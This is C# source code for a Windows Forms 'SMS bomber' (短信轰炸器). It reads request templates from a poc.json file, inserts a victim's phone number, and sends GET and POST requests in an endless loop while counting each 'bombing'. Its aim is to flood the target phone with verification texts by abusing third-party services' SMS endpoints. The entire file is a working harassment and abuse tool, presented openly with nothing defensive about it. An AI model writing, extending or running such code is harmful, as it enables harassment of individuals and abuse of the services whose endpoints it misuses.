using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Converters;
using System.Text.RegularExpressions;
using System.Net;

namespace 短信轰炸器
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.StartPosition = FormStartPosition.CenterScreen;
            Control.CheckForIllegalCrossThreadCalls = false;
        }
        public bool flag=true;

        private void start_Click(object sender, EventArgs e)
        {

            Thread t = new Thread(send_data);//创建了线程还未开启
            t.IsBackground = true;
            t.Start();//用来给函数传递参数，开启线程
    

        }
        private void send_data()
        {
            string phone = phone_num.Text;
            

            if (phone.Length == 11 && phone != "")
            {
                start.Enabled = false;
                flag = true;
                //手机号码正则
                string dianxin = @"^1[356789]\d{9}$";
                Regex regexDX = new Regex(dianxin);
                if (regexDX.IsMatch(phone))
                {

                    try
                    {
                        //存入所有的文件数据
                        List<string> scoreList = new List<string>();//创建了一个空列表
                        using (StreamReader sr = new StreamReader("poc.json"))
                        {
                            string line;
                            while ((line = sr.ReadLine()) != null && line != "")
                            {
                                scoreList.Add(line);

                            }
                        }
                        //按行遍历数据
                        int num = 0;
                        while (flag)
                        {
                            foreach (string condata in scoreList)
                            {

                                //存入转为字典的数据
                                Dictionary<string, string> dic = JsonConvert.DeserializeObject<Dictionary<string, string>>(condata);
                                if (dic["Method"] == "GET")
                                {
                                    string url = dic["url"].Replace("***********", phone);
                                    request_get(url);
                                }
                                if (dic["Method"] == "POST")
                                {
                                    string data = dic["data"].Replace("***********", phone);
                                    request_post(dic["url"], data);
                                }

                                if (!flag)
                                {
                                    break;
                                }
                                num = num + 1;
                                WriteLabel("已轰炸"+num+"次");
                              
                            }

                        }

                    }
                    catch (Exception a)
                    {
                        MessageBox.Show(a.Message);
                        start.Enabled = true;
                    }
                }
            }
            else
            {
                MessageBox.Show("手机号码输入错误！");

            }

        }
        private delegate void SetTextDelegate(string value);
        private void WriteLabel(string s)
        {
            if (zhuangtai.InvokeRequired)
            {
                SetTextDelegate d = new SetTextDelegate(WriteLabel);
                zhuangtai.Invoke(d, new object[] { s });
            }
            else
            {
                zhuangtai.ForeColor = Color.Red;
                zhuangtai.Text = s;
            }
        }
        private static void  request_get(string url)
        {
            Console.WriteLine(url);
            try
            {
                WebRequest myWebRequest = WebRequest.Create(url);
                WebResponse myWebResponse = myWebRequest.GetResponse();
                Stream ReceiveStream = myWebResponse.GetResponseStream();
                string responseStr = "";
                if (ReceiveStream != null)
                {
                    StreamReader reader = new StreamReader(ReceiveStream, Encoding.UTF8);
                    responseStr = reader.ReadToEnd();
                    reader.Close();
                }
                myWebResponse.Close();
                //Console.WriteLine(responseStr);

            }
            catch
            {
            }
        }
        private static void request_post(string url, string data)
        {
            Console.WriteLine(url);
            Console.WriteLine(data);
            try
            {
                byte[] dataArray = Encoding.UTF8.GetBytes(data);
                //创建请求
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                request.Method = "POST";
                request.ContentLength = dataArray.Length;
                request.ContentType = "application/x-www-form-urlencoded";
                request.Timeout = 5000;
                //创建输入流
                Stream dataStream = null;
                dataStream = request.GetRequestStream();
                //发送请求
                dataStream.Write(dataArray, 0, dataArray.Length);
                dataStream.Close();
                //读取返回消息
                string res = string.Empty;
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                res = reader.ReadToEnd();
                reader.Close();
                //Console.WriteLine(res);
            }
            catch
            {
            }
        }

        private void stop_Click(object sender, EventArgs e)
        {
            flag = false;
            stop.Enabled = true;
            start.Enabled = true;
            zhuangtai.Text = "轰炸已停止！";
        }
    }
}
